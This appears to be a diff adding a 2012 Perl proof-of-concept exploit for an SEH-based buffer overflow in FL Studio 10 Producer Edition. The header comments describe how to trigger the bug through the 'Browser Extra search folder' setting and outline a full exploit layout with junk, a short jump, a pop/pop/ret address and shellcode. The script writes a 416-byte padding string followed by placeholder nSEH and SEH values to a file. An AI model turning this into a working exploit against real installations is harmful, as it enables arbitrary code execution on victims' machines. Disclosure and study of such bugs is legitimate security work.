@@ -1,0 +1,39 @@
+# Title  : FL Studio 10 Producer Edition - SEH Based Buffer Overflow PoC
+# Author : Dark-Puzzle (Souhail Hammou)
+# Type   : PoC
+# Risk   : High
+# Vendor : Image Line: http://www.image-line.com/downloads/flstudiodownload.html
+# Versions : 10 Producer Edition (Other Versions May be Vulnerable).
+# Tested On : Windows 7 64-bits .
+# Date : 8 October 2012
+-----------------------------------------
+-----------------------------------------
+# Gr337ings to : Inj3ct0r Team - Packetstormsecurity.org - Securityfocus.com - Jigsaw - Dark-Soldier ...
+# Fl Studio is Prone to a SEH based Buffer Overflow which allows attacker to execute arbitary code on the victim's machine .
+# To trigger the vulnerability the attacker must fake the "Browser Extra search folder" path & paste the input released from this PoC .
+# Looking a little bit deeper in the stack & in the EBP register we will see that the software will try to create a file named e.g. BBBBCCCC.NFO 
+# Then the EIP is overwritten with the SEH address .
+# The Exploit will look like this : [Junk "A" x 416] [6 Bytes Jump + 2Nops ] [p/p/r address or other] [Shellcode] .
+# Go to Options ---> File Settings ---> Choose File In the left column ---> Paste the input in Browser Extra Search Folder ---> Press Enter ---> and close the window .
+# == Crash Triggered + Seh Overwritten .
+
+#Images :
+#1st : http://s7.postimage.org/ubgogmjmz/image.png
+#2nd : http://s7.postimage.org/yymqie6zv/image.png
+#3rd : http://s7.postimage.org/3p47rnffv/image.png
+
+my $As = "\x41" x 416 ;
+my $pnseh = "\x42\x42\x42\x42";
+my $seh = "\x43\x43\x43\x43";
+
+my $input = $As.$pnseh.$seh;
+
+
+open(myfile,'>input.txt');
+print myfile $input;
+close(myfile);
+print "FL Studio 10 Producer Edition SEH Based Overflow\n";
+print "\x44\x69\x73\x63\x6F\x76\x65\x72\x65\x64\x20\x26\x20\x50\x6F\x43\x20\x42\x79\x20\x44\x61\x72\x6B\x2D\x50\x75\x7A\x7A\x6C\x65\n";
+print "Creating PoC Input\n";
+sleep 5;
+print $input ;
